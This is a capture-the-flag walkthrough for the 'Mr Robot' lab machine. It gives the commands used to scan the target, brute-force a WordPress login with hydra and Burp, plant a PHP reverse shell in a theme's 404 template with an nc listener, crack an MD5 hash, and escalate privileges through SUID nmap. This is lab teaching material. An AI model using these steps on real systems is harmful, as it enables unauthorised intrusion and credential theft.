Scan the target machine with nmap

```
nmap -sC -sV 10.10.147.82
```

![nmap](/assets/images/thm/mr-robot/nmap.png)

Open the web page

![website](/assets/images/thm/mr-robot/website.png)

Scan the web server with gobuster:

```
gobuster dir -u http://10.10.147.82/ -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt 2>/dev/null
```

![gobuster](/assets/images/thm/mr-robot/gobuster.png)

Visit the robots.txt file to find the first key

![robots](/assets/images/thm/mr-robot/robots.png)

We have found the first key and a list which probably contains credentials. <br />
From the gobuster scan we can see that there is /login page let’s visit it.

![login](/assets/images/thm/mr-robot/login.png)

We can try to brute force it. Try to type some credential and catch the request with BurpSuite.

![burp](/assets/images/thm/mr-robot/burp.png)

![error](/assets/images/thm/mr-robot/error.png)

Here is the information that we need. Now we are going to use Hydra and the file that we had found from robots.txt

```
hydra -L fsocity.dic -p something 10.10.147.82 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"
```

![hydra](/assets/images/thm/mr-robot/hydra.png)

Now we have the username: Elliot <br />

Let’s find the password

![error2](/assets/images/thm/mr-robot/error2.png)

For some reason hydra returns 0 valid passwords 

```
hydra -l Elliot -P fsocity.dic 10.10.147.82 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```

So we’ll use burp to brute the passwords. Send new request, catch it with burp and send it to Intruder to brute force the password

![burp-brute](/assets/images/thm/mr-robot/burp-brute.png)

We are in

![dashboard](/assets/images/thm/mr-robot/dashboard.png)

Now we are going to use php reverse shell `https://github.com/pentestmonkey/php-reverse-shell`. Navigate to Appearance -> Editor and paste your reverse code in 404 template. Start nc listener on your machine.

![themes](/assets/images/thm/mr-robot/themes.png)

Now navigate to <br />

`http://10.10.147.82/wordpress/wp-content/themes/twentyfifteen/404.php`

![shell](/assets/images/thm/mr-robot/shell.png)

![ls](/assets/images/thm/mr-robot/ls.png)

Unfortunately we don’t have the permissions to read the second key but we can read the other file, let's crack the hash

```
john hash.txt --wordlist=fsocity.dic --format=Raw-MD5
```

![john](/assets/images/thm/mr-robot/john.png)

For some reason john returns the hash in capital letters. You can also use `https://crackstation.net/` to crack the hash

![crack](/assets/images/thm/mr-robot/crack.png)

![robot](/assets/images/thm/mr-robot/robot.png)

Now we are able to read the second key. <br />

Privilege Escalation 

```
find / -perm +6000 2>/dev/null | grep '/bin/'
```

![perm](/assets/images/thm/mr-robot/perm.png)

It looks we can use nmap for your privilege `https://gtfobins.github.io/gtfobins/nmap/`

![root](/assets/images/thm/mr-robot/root.png)
